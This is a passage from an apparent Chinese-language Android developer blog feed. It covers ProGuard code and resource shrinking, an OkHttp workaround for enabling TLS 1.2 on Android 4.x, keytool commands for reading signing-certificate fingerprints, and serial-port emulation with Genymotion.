<p>要通过 ProGuard 启用代码压缩，请在 build.gradle<br> 文件内相应的构建类型中添加 minifyEnabled true<br>。<br>请注意，代码压缩会拖慢构建速度，因此您应该尽可能避免在调试构建中使用。不过，重要的是您一定要为用于测试的最终 APK 启用代码压缩，因为如果您不能充分地<a href="https://developer.android.com/studio/build/shrink-code.html#keep-code" target="_blank" rel="noopener">自定义要保留的代码</a>，可能会引入错误。<br>例如，下面这段来自 build.gradle<br> 文件的代码用于为发布构建启用代码压缩：<br>android { buildTypes { release { minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } } …}<br><strong>注</strong>：Android Studio 会在使用 <a href="https://developer.android.com/studio/run/index.html#instant-run" target="_blank" rel="noopener">Instant Run</a> 时停用 ProGuard。如果您需要为增量式构建压缩代码，请尝试<a href="https://developer.android.com/studio/build/shrink-code.html#gradle-shrinker" target="_blank" rel="noopener">试用 Gradle 压缩器</a>。<br>除了 minifyEnabled<br> 属性外，还有用于定义 ProGuard 规则的 proguardFiles<br> 属性：<br>getDefaultProguardFile(‘proguard-android.txt’)<br> 方法可从 Android SDK tools/proguard/<br> 文件夹获取默认的 ProGuard 设置。<strong>提示</strong>：要想做进一步的代码压缩，请尝试使用位于同一位置的 proguard-android-optimize.txt<br> 文件。它包括相同的 ProGuard 规则，但还包括其他在字节码一级（方法内和方法间）执行分析的优化，以进一步减小 APK 大小和帮助提高其运行速度。</p>
<p>proguard-rules.pro<br> 文件用于添加自定义 ProGuard 规则。默认情况下，该文件位于模块根目录（build.gradle<br> 文件旁）。</p>
<p>要添加更多各构建变体专用的 ProGuard 规则，请在相应的 productFlavor<br> 代码块中再添加一个 proguardFiles<br> 属性。例如，以下 Gradle 文件会向 flavor2<br> 产品定制添加 flavor2-rules.pro<br>。现在 flavor2<br> 使用所有三个 ProGuard 规则，因为还应用了来自 release<br> 代码块的规则。<br>android { … buildTypes { release { minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } } productFlavors { flavor1 { } flavor2 { proguardFile ‘flavor2-rules.pro’ } }}<br>每次构建时 ProGuard 都会输出下列文件：<br>dump.txt</p>
<p>说明 APK 中所有类文件的内部结构。<br>mapping.txt</p>
<p>提供原始与混淆过的类、方法和字段名称之间的转换。<br>seeds.txt</p>
<p>列出未进行混淆的类和成员。<br>usage.txt</p>
<p>列出从 APK 移除的代码。</p>
<p>这些文件保存在 <module-name>/build/outputs/mapping/release/<br> 中。<br>自定义要保留的代码<br>对于某些情况，默认 ProGuard 配置文件 (proguard-android.txt<br>) 足以满足需要，ProGuard 会移除所有（并且只会移除）未使用的代码。不过，ProGuard 难以对许多情况进行正确分析，可能会移除应用真正需要的代码。举例来说，它可能错误移除代码的情况包括：<br>当应用引用的类只来自 AndroidManifest.xml<br> 文件时<br>当应用调用的方法来自 Java 原生接口 (JNI) 时<br>当应用在运行时（例如使用反射或自检）操作代码时</module-name></p>
<p>测试应用应该能够发现因不当移除的代码而导致的错误，但您也可以通过查看 <module-name>/build/outputs/mapping/release/<br> 中保存的 usage.txt<br> 输出文件来检查移除了哪些代码。<br>要修正错误并强制 ProGuard 保留特定代码，请在 ProGuard 配置文件中添加一行 <a href="https://stuff.mit.edu/afs/sipb/project/android/sdk/android-sdk-linux/tools/proguard/docs/index.html#manual/usage.html" target="_blank" rel="noopener">-keep</a><br> 代码。例如：<br>-keep public class MyClass<br>或者，您可以向您想保留的代码添加 <a href="https://developer.android.com/reference/android/support/annotation/Keep.html" target="_blank" rel="noopener">@Keep</a><br> 注解。在类上添加 @Keep<br> 可原样保留整个类。在方法或字段上添加它可完整保留方法/字段（及其名称）以及类名称。请注意，只有在使用<a href="https://developer.android.com/studio/write/annotations.html" target="_blank" rel="noopener">注解支持库</a>时，才能使用此注解。<br>在使用 -keep<br> 选项时，有许多事项需要考虑；如需了解有关自定义配置文件的详细信息，请阅读 <a href="http://stuff.mit.edu/afs/sipb/project/android/sdk/android-sdk-linux/tools/proguard/docs/index.html#manual/introduction.html" target="_blank" rel="noopener">ProGuard 手册</a>。<a href="http://stuff.mit.edu/afs/sipb/project/android/sdk/android-sdk-linux/tools/proguard/docs/index.html#manual/troubleshooting.html" target="_blank" rel="noopener">问题排查</a>一章概述了您可能会在混淆代码时遇到的其他常见问题。<br>解码混淆过的堆叠追踪<br>在 ProGuard 压缩代码后，读取堆叠追踪变得困难（即使并非不可行），因为方法名称经过了混淆处理。幸运的是，ProGuard 每次运行时都会创建一个 mapping.txt<br> 文件，其中显示了与混淆过的名称对应的原始类名称、方法名称和字段名称。ProGuard 将该文件保存在应用的 <module-name>/build/outputs/mapping/release/<br> 目录中。<br>请注意，您每次使用 ProGuard 创建发布构建时都会覆盖 mapping.txt<br> 文件，因此您每次发布新版本时都必须小心地保存一个副本。通过为每个发布构建保留一个 mapping.txt<br> 文件副本，您就可以在用户提交的已混淆堆叠追踪来自旧版本应用时对问题进行调试。<br>在 Google Play 上发布应用时，您可以上传每个 APK 版本的 mapping.txt<br> 文件。Google Play 将根据用户报告的问题对收到的堆叠追踪进行去混淆处理，以便您在 Google Play Developer Console 中进行检查。如需了解详细信息，请参阅帮助中心有关如何<a href="https://support.google.com/googleplay/android-developer/answer/6295281" target="_blank" rel="noopener">对崩溃堆叠追踪进行去混淆处理</a>的文章。<br>要自行将混淆过的堆叠追踪转换成可读的堆叠追踪，请使用 retrace<br> 脚本（在 Windows 上为 retrace.bat<br>；在 Mac/Linux 上为 retrace.sh<br>）。它位于 <sdk-root>/tools/proguard/<br> 目录中。该脚本利用 mapping.txt<br> 文件和您的堆叠追踪生成新的可读堆叠追踪。使用 retrace 工具的语法如下：<br>retrace.bat|retrace.sh [-verbose] mapping.txt [&lt;stacktrace_file&gt;]<br>例如：<br>retrace.bat -verbose mapping.txt obfuscated_trace.txt<br>如果您不指定堆叠追踪文件，retrace 工具会从标准输入读取。<br>通过 Instant Run 启用代码压缩<br>如果代码压缩在您增量构建应用时非常重要，请尝试<a href="https://developer.android.com/studio/releases/gradle-plugin.html" target="_blank" rel="noopener">适用于 Gradle 的 Android 插件</a>内置的试用代码压缩器。与 ProGuard 不同，此压缩器支持 <a href="https://developer.android.com/studio/run/index.html#instant-run" target="_blank" rel="noopener">Instant Run</a>。<br>您也可以使用与 ProGuard 相同的配置文件来配置 Android 插件压缩器。但是，<strong>Android 插件压缩器不会对您的代码进行混淆处理或优化</strong>，它只会删除未使用的代码。因此，您应该仅将其用于调试构建，并为发布构建启用 ProGuard，以便对发布 APK 的代码进行混淆处理和优化。<br>要启用 Android 插件压缩器，只需在 “debug” 构建类型中将 useProguard<br> 设置为 false<br>（并保留 minifyEnabled<br> 设置 true<br>）：<br>android { buildTypes { debug { minifyEnabled true <strong>useProguard false</strong> proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } release { minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } }}<br><strong>注</strong>：如果 Android 插件压缩器最初删除了某个方法，但您之后更改了代码，使该方法可访问，Instant Run 会将其视为<a href="https://developer.android.com/studio/run/index.html#ir-table" target="_blank" rel="noopener">结构代码更改</a>并执行冷交换。<br>压缩资源<br>资源压缩只与代码压缩协同工作。代码压缩器移除所有未使用的代码后，资源压缩器便可确定应用仍然使用的资源。这在您添加包含资源的代码库时体现得尤为明显 - 您必须移除未使用的库代码，使库资源变为未引用资源，才能通过资源压缩器将它们移除。<br>要启用资源压缩，请在 build.gradle<br> 文件中将 shrinkResources<br> 属性设置为 true<br>（在用于代码压缩的 minifyEnabled<br> 旁边）。例如：<br>android { … buildTypes { release { shrinkResources true minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } }}<br>如果您尚未使用代码压缩用途的 minifyEnabled<br> 构建应用，请先尝试使用它，然后再启用 shrinkResources<br>，因为您可能需要编辑 proguard-rules.pro<br>文件以保留动态创建或调用的类或方法，然后再开始移除资源。<br><strong>注</strong>：资源压缩器目前不会移除 values/<br> 文件夹中定义的资源（例如字符串、尺寸、样式和颜色）。这是因为 Android 资源打包工具 (AAPT) 不允许 Gradle 插件为资源指定预定义版本。有关详情，请参阅<a href="https://code.google.com/p/android/issues/detail?id=70869" target="_blank" rel="noopener">问题 70869</a>。<br>自定义要保留的资源<br>如果您有想要保留或舍弃的特定资源，请在您的项目中创建一个包含 <resources><br> 标记的 XML 文件，并在 tools:keep<br> 属性中指定每个要保留的资源，在 tools:discard<br> 属性中指定每个要舍弃的资源。这两个属性都接受逗号分隔的资源名称列表。您可以使用星号字符作为通配符。<br>例如：<br>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<resources xmlns:tools="http://schemas.android.com/tools" tools:keep="@layout/l_used*_c,@layout/l_used_a,@layout/l_used_b*" tools:discard="@layout/unused2"><br>将该文件保存在项目资源中，例如，保存在 res/raw/keep.xml<br>。构建不会将该文件打包到 APK 之中。<br>指定要舍弃的资源可能看似愚蠢，因为您本可将它们删除，但在使用构建变体时，这样做可能很有用。例如，如果您明知给定资源表面上会在代码中使用（并因此不会被压缩器移除），但实际不会用于给定构建变体，就可以将所有资源放入公用项目目录，然后为每个构建变体创建一个不同的 keep.xml<br> 文件。构建工具也可能无法根据需要正确识别资源，这是因为编译器会添加内联资源 ID，而资源分析器可能不知道真正引用的资源和恰巧具有相同值的代码中的整数值之间的差别。<br>启用严格引用检查<br>正常情况下，资源压缩器可准确判定系统是否使用了资源。不过，如果您的代码调用 <a href="https://developer.android.com/reference/android/content/res/Resources.html#getIdentifier(java.lang.String, java.lang.String, java.lang.String" target="_blank" rel="noopener">Resources.getIdentifier()</a>)<br>（或您的任何库进行了这一调用 - <a href="https://developer.android.com/topic/libraries/support-library/features.html#v7-appcompat" target="_blank" rel="noopener">AppCompat</a> 库会执行该调用），这就表示您的代码将根据动态生成的字符串查询资源名称。当您执行这一调用时，默认情况下资源压缩器会采取防御性行为，将所有具有匹配名称格式的资源标记为可能已使用，无法移除。<br>例如，以下代码会使所有带 img_<br> 前缀的资源标记为已使用。<br>String name = String.format(“img_%1d”, angle + 1);res = getResources().getIdentifier(name, “drawable”, getPackageName());<br>资源压缩器还会浏览代码以及各种 res/raw/<br> 资源中的所有字符串常量，寻找格式类似于 file:///android_res/drawable//ic_plus_anim_016.png<br> 的资源网址。如果它找到与其类似的字符串，或找到其他看似可用来构建与其类似的网址的字符串，则不会将它们移除。<br>这些是默认情况下启用的安全压缩模式的示例。但您可以停用这一“有备无患”处理方式，并指定资源压缩器只保留其确定已使用的资源。要执行此操作，请在 keep.xml<br> 文件中将 shrinkMode<br> 设置为 strict<br>，如下所示：<br>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<resources xmlns:tools="http://schemas.android.com/tools" tools:shrinkmode="strict"><br>如果您确已启用严格压缩模式，并且代码也引用了包含动态生成字符串的资源（如上所示），则必须利用 tools:keep<br> 属性手动保留这些资源。<br>移除未使用的备用资源<br>Gradle 资源压缩器只会移除未被您的应用代码引用的资源，这意味着它不会移除用于不同设备配置的<a href="https://developer.android.com/guide/topics/resources/providing-resources.html#AlternativeResources" target="_blank" rel="noopener">备用资源</a>。必要时，您可以使用 Android Gradle 插件的 resConfigs<br> 属性来移除您的应用不需要的备用资源文件。<br>例如，如果您使用的库包含语言资源（例如使用的是 AppCompat 或 Google Play 服务），则 APK 将包括这些库中消息的所有已翻译语言字符串，无论应用的其余部分是否翻译为同一语言。如果您想只保留应用正式支持的语言，则可以利用 resConfig<br> 属性指定这些语言。系统会移除未指定语言的所有资源。<br>下面这段代码展示了如何将语言资源限定为仅支持英语和法语：<br>android { defaultConfig { … resConfigs “en”, “fr” }}<br>同理，您也可以利用 <a href="https://developer.android.com/studio/build/configure-apk-splits.html" target="_blank" rel="noopener">APK 拆分</a>为不同设备构建不同的 APK，自定义在 APK 中包括的屏幕密度或 ABI 资源。<br>合并重复资源<br>默认情况下，Gradle 还会合并同名资源，例如可能位于不同资源文件夹中的同名可绘制对象。这一行为不受 shrinkResources<br> 属性控制，也无法停用，因为在有多个资源匹配代码查询的名称时，有必要利用这一行为来避免错误。<br>只有在两个或更多个文件具有完全相同的资源名称、类型和限定符时，才会进行资源合并。Gradle 会在重复项中选择其视为最佳选择的文件（根据下述优先顺序），并只将这一个资源传递给 AAPT，以供在 APK 文件中分发。<br>Gradle 会在下列位置寻找重复资源：<br>与主源集关联的主资源，一般位于 src/main/res/<br> 中。<br>变体叠加，来自构建类型和构建风味。<br>库项目依赖项。</resources></resources></resources></sdk-root></module-name></module-name></p>
<p>Gradle 会按以下级联优先顺序合并重复资源：<br>依赖项 → 主资源 → 构建风味 → 构建类型<br>例如，如果某个重复资源同时出现在主资源和构建风味中，Gradle 会选择构建风味中的重复资源。<br>如果完全相同的资源出现在同一源集中，Gradle 无法合并它们，并且会发出资源合并错误。如果您在 build.gradle<br> 文件的 sourceSet<br> 属性中定义了多个源集，则可能会发生这种情况，例如，如果 src/main/res/<br> 和 src/main/res2/<br> 包含完全相同的资源，就可能会发生这种情况。<br>排查资源压缩问题<br>当您压缩资源时，Gradle Console 会显示它从应用软件包中移除的资源的摘要。例如：<br>:android:shrinkDebugResourcesRemoved unused resources: Binary resource data reduced from 2570KB to 1711KB: Removed 33%:android:validateDebugSigning<br>Gradle 还会在 <module-name>/build/outputs/mapping/release/<br>（ProGuard 输出文件所在的文件夹）中创建一个名为 resources.txt 的诊断文件。该文件包括诸如哪些资源引用了其他资源以及使用或移除了哪些资源等详情。</module-name></p>
<p>例如，要了解您的 APK 为何仍包含 @drawable/ic_plus_anim_016<br>，请打开 resources.txt<br> 文件并搜索该文件名。您可能会发现，有其他资源引用了它，如下所示：<br>16:25:48.005 [QUIET] [system.out] @drawable/add_schedule_fab_icon_anim : reachable=true16:25:48.009 [QUIET] [system.out] @drawable/ic_plus_anim_016<br>现在您需要了解为何 @drawable/add_schedule_fab_icon_anim<br> 可以访问 - 如果您向上搜索，就会发现“The root reachable resources are:”之下列有该资源。这意味着存在对 add_schedule_fab_icon_anim<br> 的代码引用（即在可访问代码中找到了其 R.drawable ID）。<br>如果您使用的不是严格检查，则存在看似可用于为动态加载资源构建资源名称的字符串常量时，可将资源 ID 标记为可访问。在这种情况下，如果您在构建输出中搜索资源名称，可能会找到类似下面这样的消息：<br>10:32:50.590 [QUIET] [system.out] Marking drawable:ic_plus_anim_016:2130837506 used because it format-string matches string pool constant ic_plus_anim_%1$d.<br>如果您看到一个这样的字符串，并且您能确定该字符串未用于动态加载给定资源，就可以按照有关如何<a href="https://developer.android.com/studio/build/shrink-code.html#keep-resources" target="_blank" rel="noopener">自定义要保留的资源</a>部分中所述利用 tools:discard<br> 属性通知构建系统将它移除。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android4.x不能用SSL-TLS1.2</title>
    <url>/Android/Android4.x%E4%B8%8D%E8%83%BD%E7%94%A8SSL-TLS1.2/</url>
    <content><![CDATA[<p>目前Android4.x也算是老设备了，今天做的一个项目访问客户的 <code>HTTPS</code> 服务器，在Android4.x一直抛异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.net.ssl.SSLException: Connection closed by peer</span><br></pre></td></tr></table></figure>
<p>这是由于 <code>Android4.x</code> 默认关闭 <code>TLS</code> 的支持和 <code>OkHTTP3.x</code> 的问题，这个问题的讨论在于 <a href="https://github.com/square/okhttp/issues/2372" target="_blank" rel="noopener">issues/2372</a>  。</p>
<h3 id="解决这个问题有两个大方向："><a href="#解决这个问题有两个大方向：" class="headerlink" title="解决这个问题有两个大方向："></a>解决这个问题有两个大方向：</h3><ol>
<li>服务器配置兼容支持TLS1.0、TLS1.1、TLS1.2，这样客户端就不需要做任何处理，完美兼容</li>
<li>Android端开启TLS1.2支持</li>
</ol>
<h3 id="Android端解决"><a href="#Android端解决" class="headerlink" title="Android端解决"></a>Android端解决</h3><p>服务器不是我们的，只好从Android端入手。参考 <a href="https://github.com/square/okhttp/issues/2372" target="_blank" rel="noopener">issues/2372</a>  的解决版本，摘取如下：</p>
<p>添加一个 <code>Tls12SocketFactory.java</code> 类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocket;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Enables TLS v1.2 when creating SSLSockets.</span></span><br><span class="line"><span class="comment"> * &lt;p/&gt;</span></span><br><span class="line"><span class="comment"> * For some reason, android supports TLS v1.2 from API 16, but enables it by</span></span><br><span class="line"><span class="comment"> * default only from API 20.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://developer.android.com/reference/javax/net/ssl/SSLSocket.html</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> SSLSocketFactory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tls12SocketFactory</span> <span class="keyword">extends</span> <span class="title">SSLSocketFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] TLS_V12_ONLY = &#123;<span class="string">"TLSv1.2"</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> SSLSocketFactory delegate;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tls12SocketFactory</span><span class="params">(SSLSocketFactory base)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.delegate = base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getDefaultCipherSuites() &#123;</span><br><span class="line">        <span class="keyword">return</span> delegate.getDefaultCipherSuites();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getSupportedCipherSuites() &#123;</span><br><span class="line">        <span class="keyword">return</span> delegate.getSupportedCipherSuites();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Socket <span class="title">createSocket</span><span class="params">(Socket s, String host, <span class="keyword">int</span> port, <span class="keyword">boolean</span> autoClose)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> patch(delegate.createSocket(s, host, port, autoClose));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Socket <span class="title">createSocket</span><span class="params">(String host, <span class="keyword">int</span> port)</span> <span class="keyword">throws</span> IOException, UnknownHostException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> patch(delegate.createSocket(host, port));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Socket <span class="title">createSocket</span><span class="params">(String host, <span class="keyword">int</span> port, InetAddress localHost, <span class="keyword">int</span> localPort)</span> <span class="keyword">throws</span> IOException, UnknownHostException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> patch(delegate.createSocket(host, port, localHost, localPort));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Socket <span class="title">createSocket</span><span class="params">(InetAddress host, <span class="keyword">int</span> port)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> patch(delegate.createSocket(host, port));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Socket <span class="title">createSocket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port, InetAddress localAddress, <span class="keyword">int</span> localPort)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> patch(delegate.createSocket(address, port, localAddress, localPort));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Socket <span class="title">patch</span><span class="params">(Socket s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s <span class="keyword">instanceof</span> SSLSocket) &#123;</span><br><span class="line">            ((SSLSocket) s).setEnabledProtocols(TLS_V12_ONLY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码中加入以下方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> OkHttpClient.<span class="function">Builder <span class="title">enableTls12OnPreLollipop</span><span class="params">(OkHttpClient.Builder client)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">16</span> &amp;&amp; Build.VERSION.SDK_INT &lt; <span class="number">22</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SSLContext sc = SSLContext.getInstance(<span class="string">"TLSv1.2"</span>);</span><br><span class="line">            sc.init(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            client.sslSocketFactory(<span class="keyword">new</span> Tls12SocketFactory(sc.getSocketFactory()));</span><br><span class="line"></span><br><span class="line">            ConnectionSpec cs = <span class="keyword">new</span> ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)</span><br><span class="line">                    .tlsVersions(TlsVersion.TLS_1_2)</span><br><span class="line">                    .build();</span><br><span class="line"></span><br><span class="line">            List&lt;ConnectionSpec&gt; specs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            specs.add(cs);</span><br><span class="line">            specs.add(ConnectionSpec.COMPATIBLE_TLS);</span><br><span class="line">            specs.add(ConnectionSpec.CLEARTEXT);</span><br><span class="line"></span><br><span class="line">            client.connectionSpecs(specs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exc) &#123;</span><br><span class="line">            Log.e(<span class="string">"OkHttpTLSCompat"</span>, <span class="string">"Error while setting TLS 1.2"</span>, exc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> client;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对 <code>OkHttpClient</code> 实例进行处理，如结合 <code>Retrofit</code> 使用如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OkHttpClient.Builder builder = <span class="keyword">new</span> OkHttpClient.Builder();</span><br><span class="line"><span class="comment">//...builder conf</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">OkHttpClient client = enableTls12OnPreLollipop(builder).build();</span><br><span class="line">Retrofit retrofit = <span class="keyword">new</span> Retrofit.Builder()</span><br><span class="line">                            .baseUrl(BASE_URL)</span><br><span class="line">                            .client()</span><br><span class="line">                            .build();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>SSL</tag>
      </tags>
  </entry>
  <entry>
    <title>Android获取签名的指纹</title>
    <url>/Android/Android%E8%8E%B7%E5%8F%96%E7%AD%BE%E5%90%8D%E7%9A%84%E6%8C%87%E7%BA%B9/</url>
    <content><![CDATA[<p>签名的指纹在对接一些平台会用到，如微信，高德等。 </p>
<p>很久没用，忘记了，这里记录一下，方便以后使用</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ keytool -list -v -keystore 签名文件</span><br></pre></td></tr></table></figure>
<h2 id="Debug默认的签名"><a href="#Debug默认的签名" class="headerlink" title="Debug默认的签名"></a>Debug默认的签名</h2><p>Android Studio的默认Debug签名是在用户的 <code>.android</code> 目录中（如Windows下的：C:\Users\sam.android），文件名为 <code>debug.keystore</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ keytool -list -v -keystore debug.keystore</span><br><span class="line">输入密钥库口令: (密码是android)</span><br></pre></td></tr></table></figure>
<h2 id="自定义签名"><a href="#自定义签名" class="headerlink" title="自定义签名"></a>自定义签名</h2><p>现在自定义签名是 <code>*.jks</code> 文件,这里为你打包apk所用的签名<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ keytool -list -v -keystore alis.jks</span><br><span class="line">输入密钥库口令: (密码是自己设的)</span><br><span class="line">密钥库类型: jks</span><br><span class="line">密钥库提供方: SUN</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span class="line"></span><br><span class="line">别名: honor</span><br><span class="line">创建日期: 2019-12-12</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: CN=Dog, OU=Teng, O=GouQuan, L=Beijing, ST=China, C=CHN</span><br><span class="line">发布者: CN=Dog, OU=Teng, O=GouQuan, L=Beijing, ST=China, C=CHN</span><br><span class="line">序列号: 5647d295</span><br><span class="line">有效期为 Thu Dec 12 10:51:28 CST 2019 至 Mon Dec 05 10:51:28 CST 2044</span><br><span class="line">证书指纹:</span><br><span class="line">         MD5:  6F:7F:E4:86:BC:F7:B4:F2:2E:B0:87:FA:8B:2E:06:99</span><br><span class="line">         SHA1: 48:93:C4:B5:E7:CB:1B:49:EA:B5:A6:08:C9:B1:8D:FC:5E:CB:A8:74</span><br><span class="line">         SHA256: 9E:28:9C:8F:A0:01:F7:55:B8:CA:0B:30:6D:B6:10:16:B5:E5:88:72:E5:31:60:6E:F5:25:C3:B5:09:A3:5D:13</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展:</span><br><span class="line"></span><br><span class="line"><span class="comment">#1: ObjectId: 2.5.29.14 Criticality=false</span></span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 3F F7 B4 C9 12 3F 34 F9   DB FF 27 E5 A0 6C B7 25  ?....?4...<span class="string">'..l.%</span></span><br><span class="line"><span class="string">0010: E1 C0 06 72                                        ...r</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*******************************************</span></span><br><span class="line"><span class="string">*******************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Warning:</span></span><br><span class="line"><span class="string">JKS 密钥库使用专用格式。建议使用 "keytool -importkeystore -srckeystore alis.jks -destkeystore alis.jks -deststoretype pkcs12" 迁移到行业标准格式 PKCS12 。</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android配置模拟串口调试</title>
    <url>/Android/Android%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%8B%9F%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>开发Android IOT平台应用要用到串口，但硬件往往慢一拍，我们为了快速调试，可以使用模拟串口来解决问题。</p>
<p>本文最终实现：PC端口串口和Genymotion模拟器串口进行通信。</p>
<h2 id="安装模拟工具"><a href="#安装模拟工具" class="headerlink" title="安装模拟工具"></a>安装模拟工具</h2><p>在Windows平台下安装 <code>串口模拟工具-VSP</code> 新建一对串口模拟COM1和COM2。<br><img src="/images/android/serialport111.png" alt="创建"><br><img src="/images/android/serialport222.png" alt="选择pair"><br><img src="/images/android/serialport333.png" alt="命名串口"><br><img src="/images/android/serialport444.png" alt="启动串口模拟"></p>
<h2 id="配置Genymotion模拟器"><a href="#配置Genymotion模拟器" class="headerlink" title="配置Genymotion模拟器"></a>配置Genymotion模拟器</h2><ol>
<li><p>确定目标模拟器<br><img src="/images/android/serialport555.png" alt></p>
</li>
<li><p>通过VirtualBox来设置串口<br><img src="/images/android/serialport666.png" alt><br><img src="/images/android/serialport777.png" alt></p>
</li>
</ol>
<h2 id="在PC端用串口工具打开COM2"><a href="#在PC端用串口工具打开COM2" class="headerlink" title="在PC端用串口工具打开COM2"></a>在PC端用串口工具打开COM2</h2><p><img src="/images/android/serialport888.png" alt></p>
<h2 id="在Android-App中打开串口-COM1"><a href="#在Android-App中打开串口-COM1" class="headerlink" title="在Android App中打开串口 COM1"></a>在Android App中打开串口 <code>COM1</code></h2><p><code>COM1</code> 在Linux的串口命名为 <code>/dev/ttyS0</code> </p>
<h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><p>Android App运行在 <code>Genymotion</code> 模拟器上打开了 <code>COM1</code> ，PC上串口工具打开了<code>COM2</code> ，两者可以相互收发数据。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>串口</tag>
      </tags>
  </entry>
  <entry>
    <title>Android通过 HTTPS 和 SSL 确保安全.md</title>
